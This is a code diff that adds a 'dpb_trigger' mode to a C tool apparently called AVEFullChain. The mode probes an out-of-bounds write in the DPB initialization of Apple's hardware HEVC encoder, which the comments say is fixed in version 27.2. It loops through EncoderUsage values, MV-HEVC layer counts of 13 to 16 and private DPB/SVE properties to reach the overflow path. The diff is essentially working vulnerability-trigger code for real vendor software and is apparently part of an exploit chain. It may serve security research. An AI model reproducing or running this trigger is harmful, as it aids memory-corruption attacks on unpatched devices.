@@ -11753,6 +11753,169 @@ vps_cd_done:
              last_ok_offset_l3, first_hang_offset_l3);
         rlog("\n=== NTL_HANG_SEARCH complete ===\n");
 
+    } else if (strcmp(mode, "dpb_trigger") == 0) {
+        /*
+         * dpb_trigger — Probe DPB initialization OOB write path (SKVLENT finding).
+         *
+         * DPB init has array[12] but count can reach 13-16.
+         * 27.2 fix: `param_4 < 0xd`. Trigger needs session[0x227c]==1 && [0x2224]==7.
+         * Tests EncoderUsage, profiles, MV-HEVC layers, and private properties.
+         */
+        rlog("=== DPB_TRIGGER: Probe DPB init OOB path ===\n\n");
+        int phase = (argc > 2) ? atoi(argv[2]) : 0;
+
+        if (phase == 0 || phase == 1) {
+            rlog("--- Phase 1: EncoderUsage scan ---\n");
+            int eu_vals[] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 16, 32, 64};
+            for (int ei = 0; ei < 12; ei++) {
+                int eu = eu_vals[ei];
+                VTCompressionSessionRef s = NULL;
+                CFMutableDictionaryRef es = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+                CFDictionarySetValue(es, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+                CFNumberRef eu_num = CFNumberCreate(NULL, kCFNumberIntType, &eu);
+                CFDictionarySetValue(es, CFSTR("EncoderUsage"), eu_num);
+                CFRelease(eu_num);
+                OSStatus cs = VTCompressionSessionCreate(NULL, 192, 192,
+                    kCMVideoCodecType_HEVC, es, NULL, NULL, encode_cb, NULL, &s);
+                CFRelease(es);
+                if (cs != noErr || !s) { rlog("  EU=%d: create=%d\n", eu, (int)cs); continue; }
+                rlog("  EU=%d: OK", eu);
+                /* Try DPB properties */
+                int dpb_vals[] = {13, 15, 16, 24};
+                for (int d = 0; d < 4; d++) {
+                    CFNumberRef dv = CFNumberCreate(NULL, kCFNumberIntType, &dpb_vals[d]);
+                    OSStatus ds1 = VTSessionSetProperty(s, CFSTR("DPBRequirements"), dv);
+                    OSStatus ds2 = VTSessionSetProperty(s, CFSTR("UserDPBFramesForFaceTime"), dv);
+                    if (ds1 == noErr) rlog(" DPB(%d)=OK", dpb_vals[d]);
+                    if (ds2 == noErr) rlog(" UDPB(%d)=OK", dpb_vals[d]);
+                    CFRelease(dv);
+                }
+                int ntl = 8;
+                CFNumberRef nv = CFNumberCreate(NULL, kCFNumberIntType, &ntl);
+                VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), nv);
+                CFRelease(nv);
+                VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+                OSStatus prep = VTCompressionSessionPrepareToEncodeFrames(s);
+                rlog(" prep=%d", (int)prep);
+                if (prep == noErr) {
+                    g_encode_done = 0; g_cb_status = -999;
+                    CVPixelBufferRef pb = NULL;
+                    CVPixelBufferCreate(NULL, 192, 192, kCVPixelFormatType_32BGRA, NULL, &pb);
+                    if (pb) {
+                        CVPixelBufferLockBaseAddress(pb, 0);
+                        memset(CVPixelBufferGetBaseAddress(pb), 0x42, CVPixelBufferGetDataSize(pb));
+                        CVPixelBufferUnlockBaseAddress(pb, 0);
+                        VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(0,30), kCMTimeInvalid, NULL, NULL, NULL);
+                        VTCompressionSessionCompleteFrames(s, kCMTimePositiveInfinity);
+                        for (int w=0; w<100 && !g_encode_done; w++) usleep(10000);
+                        rlog(" enc=%d cb=%d", 0, (int)g_cb_status);
+                        CVPixelBufferRelease(pb);
+                    }
+                }
+                VTCompressionSessionInvalidate(s); CFRelease(s);
+                rlog("\n");
+            }
+        }
+
+        if (phase == 0 || phase == 2) {
+            rlog("\n--- Phase 2: MV-HEVC layer counts (target: 13-16 for DPB OOB) ---\n");
+            int lc[] = {2, 3, 4, 6, 8, 12, 13, 14, 15, 16};
+            for (int li = 0; li < 10; li++) {
+                int nl = lc[li];
+                VTCompressionSessionRef s = NULL;
+                CFMutableDictionaryRef es = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+                CFDictionarySetValue(es, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+                CFMutableArrayRef layerIDs = CFArrayCreateMutable(NULL, nl, &kCFTypeArrayCallBacks);
+                CFMutableArrayRef viewIDs = CFArrayCreateMutable(NULL, nl, &kCFTypeArrayCallBacks);
+                for (int l = 0; l < nl; l++) {
+                    CFNumberRef lid = CFNumberCreate(NULL, kCFNumberIntType, &l);
+                    CFArrayAppendValue(layerIDs, lid);
+                    CFArrayAppendValue(viewIDs, lid);
+                    CFRelease(lid);
+                }
+                CFDictionarySetValue(es, CFSTR("MVHEVCVideoLayerIDs"), layerIDs);
+                CFDictionarySetValue(es, CFSTR("MVHEVCViewIDs"), viewIDs);
+                CFRelease(layerIDs); CFRelease(viewIDs);
+                OSStatus cs = VTCompressionSessionCreate(NULL, 192, 192,
+                    kCMVideoCodecType_HEVC, es, NULL, NULL, encode_cb, NULL, &s);
+                CFRelease(es);
+                if (cs != noErr || !s) { rlog("  layers=%d: create=%d\n", nl, (int)cs); continue; }
+                rlog("  layers=%d: OK", nl);
+                VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+                OSStatus prep = VTCompressionSessionPrepareToEncodeFrames(s);
+                rlog(" prep=%d", (int)prep);
+                if (prep == noErr) {
+                    g_encode_done = 0; g_cb_status = -999;
+                    CVPixelBufferRef pb = NULL;
+                    CVPixelBufferCreate(NULL, 192, 192, kCVPixelFormatType_32BGRA, NULL, &pb);
+                    if (pb) {
+                        CVPixelBufferLockBaseAddress(pb, 0);
+                        memset(CVPixelBufferGetBaseAddress(pb), 0x42, CVPixelBufferGetDataSize(pb));
+                        CVPixelBufferUnlockBaseAddress(pb, 0);
+                        VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(0,30), kCMTimeInvalid, NULL, NULL, NULL);
+                        VTCompressionSessionCompleteFrames(s, kCMTimePositiveInfinity);
+                        for (int w=0; w<100 && !g_encode_done; w++) usleep(10000);
+                        rlog(" enc=%d cb=%d", 0, (int)g_cb_status);
+                        CVPixelBufferRelease(pb);
+                    }
+                }
+                VTCompressionSessionInvalidate(s); CFRelease(s);
+                rlog("\n");
+            }
+        }
+
+        if (phase == 0 || phase == 3) {
+            rlog("\n--- Phase 3: Private SVE/DPB property acceptance ---\n");
+            VTCompressionSessionRef s = NULL;
+            CFMutableDictionaryRef es = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+            CFDictionarySetValue(es, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+            OSStatus cs = VTCompressionSessionCreate(NULL, 192, 192,
+                kCMVideoCodecType_HEVC, es, NULL, NULL, encode_cb, NULL, &s);
+            CFRelease(es);
+            if (cs == noErr && s) {
+                VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+                const char *props[] = {
+                    "EncoderUsage","BaseLayerFrameRate","Quality","ExpectedFrameRate",
+                    "SourceFrameCount","MaxKeyFrameInterval","Priority","ViewPackingKind",
+                    "EncodesAlpha","RequiredHEVCVideoParameterSetAlphaLayerID",
+                    "SVEDPBSize","SVERCMode","SVEMCTFEnabled","SVEMCTFStrength",
+                    "SVETemporalLayers","UserDPBFramesForFaceTime","DPBRequirements",
+                    "RCMode","EnableSVE","ForceKeyFrame","MaxAllowedFrameQP",
+                    NULL
+                };
+                int tv[] = {0, 1, 7, 8, 12, 13, 15, 16, 20, 24, 63, 64, 255};
+                for (int p = 0; props[p]; p++) {
+                    CFStringRef pk = CFStringCreateWithCString(NULL, props[p], kCFStringEncodingUTF8);
+                    rlog("  %s:", props[p]);
+                    CFTypeRef cur = NULL;
+                    OSStatus gs = VTSessionCopyProperty(s, pk, NULL, &cur);
+                    if (gs == noErr && cur) {
+                        if (CFGetTypeID(cur) == CFNumberGetTypeID()) {
+                            int iv = 0; CFNumberGetValue(cur, kCFNumberIntType, &iv);
+                            rlog(" cur=%d", iv);
+                        }
+                        CFRelease(cur);
+                    } else rlog(" N/A(%d)", (int)gs);
+                    for (int t = 0; t < 13; t++) {
+                        CFNumberRef nv = CFNumberCreate(NULL, kCFNumberIntType, &tv[t]);
+                        OSStatus ss = VTSessionSetProperty(s, pk, nv);
+                        CFRelease(nv);
+                        if (ss == noErr) rlog(" %d=OK", tv[t]);
+                    }
+                    rlog("\n");
+                    CFRelease(pk);
+                }
+                VTCompressionSessionInvalidate(s); CFRelease(s);
+            }
+        }
+        rlog("\n=== DPB_TRIGGER complete ===\n");
+
     } else {
         rlog("Usage: AVEFullChain <mode> [args]\n\n");
         rlog("Modes:\n");
